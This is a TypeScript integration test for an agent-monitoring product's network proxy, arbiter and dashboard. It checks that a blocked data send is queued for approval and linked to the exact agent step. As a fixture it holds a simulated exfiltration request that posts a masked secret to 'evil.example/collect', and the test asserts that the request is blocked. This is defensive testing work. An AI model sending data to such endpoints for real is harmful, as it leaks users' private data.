/**
 * ask-moment-link.test.ts — an answer links back to the moment it was asked
 * (dashboard.md §4.25h), across the REAL components.
 *
 * The Rules page's answer rows and the inbox's asks open the agent page at
 * `?ask=<egr-id>`, and the page marks the step where Mandu stopped. That
 * join rests on the gate's event carrying the queue id. Before 2026-09-26 the
 * net-proxy's block event did not (only the model proxy's fs/exec gates did),
 * so a sent-data answer could not find its moment. This suite pins the whole
 * path with no mocks:
 *
 *   L1  the net-proxy, wired as production wires it
 *       (`new ArbiterClientAdapter(new ArbiterClient(sock))`), blocks a send
 *       of a masked item; its 403 body does NOT carry the queue id (the
 *       agent's business is the block, not the dashboard's join key);
 *   L2  the block's `net_action` event, as the arbiter stored it, carries
 *       `policy.approvalId` equal to the queued row's id;
 *   L3  after an Always allow over HTTP, the dashboard's
 *       `/api/home/agent?session=…&ask=<id>` marks that step with an
 *       EXACT match (not the destination fallback);
 *   L4  an id the queue does not hold marks nothing: the page says it could
 *       not find the moment, never a guess.
 *
 * Run: npm test  (tests/)
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import type { ApprovalsArbiter } from "../../dashboard/src/server.js";
import type { AgentPageVM } from "../../dashboard/src/view-model/agent-page.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";

stateAxes("injection"); // this suite states its axes (protection-modes.md §4)

const SESSION = "sess-ask-moment";
const CSRF = { "X-Mandu-Control": "1" };

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

test("a blocked send's answer links to the exact step it was asked at (real arbiter, net-proxy, dashboard)", async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-ask-moment-"));
  const socketPath = join(tmp, "arbiter.sock");
  const arbiter = new ArbiterServer({
    socketPath,
    dbPath: join(tmp, "symbols.sqlite"),
    adminSocketPath: join(tmp, "admin.sock"),
    humanSocketPath: humanSockIn(tmp),
    eventDir: join(tmp, "events"),
    log: () => {},
  });
  await arbiter.listen();

  // Production wiring of the net-proxy's arbiter (net-proxy/src/server-main.ts).
  const netClient = new ArbiterClient(socketPath);
  await netClient.connect();
  // …and its human-plane client, the shallow resolve's only channel.
  const netHuman = new ArbiterClient(humanSockIn(tmp));
  const forwarded: string[] = [];
  const proxy = new NetProxy({
    // server-main types the lazily imported client as RealArbiterClient the
    // same way (its RuleRef is the open, carried-not-read shape).
    arbiter: new ArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
    sessionId: SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a blocked send must never be forwarded");
    },
    log: () => {},
  });
  const proxyPort = await proxy.listen(0);

  const seeder = new ArbiterClient(socketPath);
  await seeder.connect();
  // The test's own event read-back rides the human plane (arbiter-human-plane.md).
  const humanReader = new ArbiterClient(humanSockIn(tmp));
  await humanReader.connect();
  const admin = new ArbiterClient(join(tmp, "admin.sock"));
  await admin.connect();
  const approvalsArbiter: ApprovalsArbiter = {
    egressApprovals: (status) => admin.egressApprovals(status),
    resolveEgressApproval: (approvalId, approve, scope) => admin.resolveEgressApproval(approvalId, approve, scope),
  };
  const dashboard = new DashboardServer({ source: new ArbiterEventSource({ socketPath }), approvalsArbiter, log: () => {} });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  const agentPage = async (ask: string): Promise<AgentPageVM> => {
    const res = await fetch(`${base}/api/home/agent?session=${SESSION}&ask=${encodeURIComponent(ask)}`);
    assert.equal(res.status, 200);
    return (await res.json()) as AgentPageVM;
  };

  try {
    // ── L1: a masked item bound for an untrusted host is blocked ─────────────
    const symbol = await seeder.symbolize({ tool: "WebFetch", field: "text", value: "exfil-me-ask-moment", sessionKey: SESSION });
    const res = await viaProxy(proxyPort, "http://evil.example/collect", `d=${symbol}`);
    assert.equal(res.status, 403);
    assert.equal(res.body.includes("exfil-me-ask-moment"), false);
    assert.equal(/egr-\d+/.test(res.body), false, "the agent's 403 body never carries the queue id");
    assert.deepEqual(forwarded, []);

    // ── L2: the stored block event names the queued row ──────────────────────
    const pending = await admin.egressApprovals("pending");
    const row = pending.find((a) => a.symbol === symbol);
    assert.ok(row, "the block queued an ask");
    let stamped: string | undefined;
    for (let i = 0; i < 50 && !stamped; i++) {
      // emission is best-effort and asynchronous
      const events = (await humanReader.events(SESSION)) as unknown as { kind: string; action?: string; policy?: { approvalId?: string } }[];
      stamped = events.find((e) => e.kind === "net_action" && e.action === "blocked")?.policy?.approvalId;
      if (!stamped) await new Promise((r) => setTimeout(r, 20));
    }
    assert.equal(stamped, row!.id, "the block's net_action carries the queue id");

    // ── L3: answered, then opened from the Rules page: the exact step ────────
    const ok = await fetch(`${base}/api/egress/approvals/${row!.id}/approve`, { method: "POST", headers: { ...CSRF, Cookie: dashboard.adminCookie() } });
    assert.equal(ok.status, 200);
    const page = await agentPage(row!.id);
    assert.equal(page.found, true);
    assert.equal(page.focus?.ask, row!.id);
    assert.equal(page.focus?.match, "exact");
    assert.ok(page.focus?.turnId, "the turn is found");
    const turn = page.story.find((t) => t.id === page.focus!.turnId)!;
    const step = turn.steps.find((s) => s.id === page.focus!.stepId);
    assert.ok(step && step.kind === "action", "the marked step is on the page");
    assert.equal(step.outcome, "blocked");
    assert.match(step.sentence.map((p) => p.text).join(""), /evil\.example/);
    assert.equal(JSON.stringify(page).includes("$MDU:"), false, "no token on the product page");

    // ── L4: an unknown id marks nothing ──────────────────────────────────────
    const none = await agentPage("egr-99999");
    assert.deepEqual(none.focus, { ask: "egr-99999", turnId: null, stepId: null, match: null });
  } finally {
    await dashboard.close();
    await proxy.close();
    netClient.close();
    seeder.close();
    netHuman.close();
    humanReader.close();
    admin.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
